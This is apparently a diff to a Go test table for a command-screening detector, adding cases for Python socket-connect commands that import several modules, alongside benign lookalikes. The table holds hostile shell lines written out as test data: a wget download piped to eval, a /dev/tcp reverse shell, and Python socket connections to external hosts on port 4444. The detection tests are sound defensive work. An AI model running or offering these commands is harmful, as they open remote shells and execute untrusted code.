@@ -271,6 +271,9 @@ func TestAdmissionCorpusActionProofs(t *testing.T) {
 		{"evaluated download substitution", `eval "$(wget -qO- https://example.net/install.sh)"`, "CMD-SUBST-DOWNLOAD-EXEC", true},
 		{"descriptor feedback shell", `exec 3<>/dev/tcp/192.0.2.8/4444; cat <&3 | sh >&3`, "CMD-REVSHELL-DEVTCP", true},
 		{"external Python socket", `python3 -c 'import socket;s=socket.socket();s.connect(("192.0.2.8",4444))'`, "CMD-PYTHON-SOCKET-CONNECT", true},
+		// #1393: the corpus command imports other modules beside socket.
+		{"external Python socket among imports", `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.8",4444))'`, "CMD-PYTHON-SOCKET-CONNECT", true},
+		{"external Python socket, spaced import list", `python3 -c 'import os, socket; s = socket.socket(); s.connect(("192.0.2.8", 4444))'`, "CMD-PYTHON-SOCKET-CONNECT", true},
 		{"benign sudo pipeline", `dpkg -l | sudo tee /tmp/packages.log`, "", false},
 		{"sudo package listing", `sudo apt list --installed`, "", false},
 		{"benign substitution", `bash -c "$(date)"`, "", false},
@@ -278,6 +281,9 @@ func TestAdmissionCorpusActionProofs(t *testing.T) {
 		{"loopback health check", `exec 3<>/dev/tcp/127.0.0.1/443; exec 3>&-`, "", false},
 		{"Python socket import", `python3 -c 'import socket;print(socket.AF_INET)'`, "", false},
 		{"Python loopback socket", `python3 -c 'import socket;s=socket.socket();s.connect(("127.0.0.1",443))'`, "", false},
+		{"Python import list without a connect", `python3 -c 'import socket,os;print(socket.gethostname())'`, "", false},
+		{"Python loopback socket among imports", `python3 -c 'import socket,os;s=socket.socket();s.connect(("127.0.0.1",443))'`, "", false},
+		{"Python import list without socket", `python3 -c 'import os,sys;print(os.getcwd())'`, "", false},
 		{"download to tee", `curl -fsSL https://example.net/install.sh | tee /tmp/install.sh`, "", false},
 	}
 	for _, test := range tests {
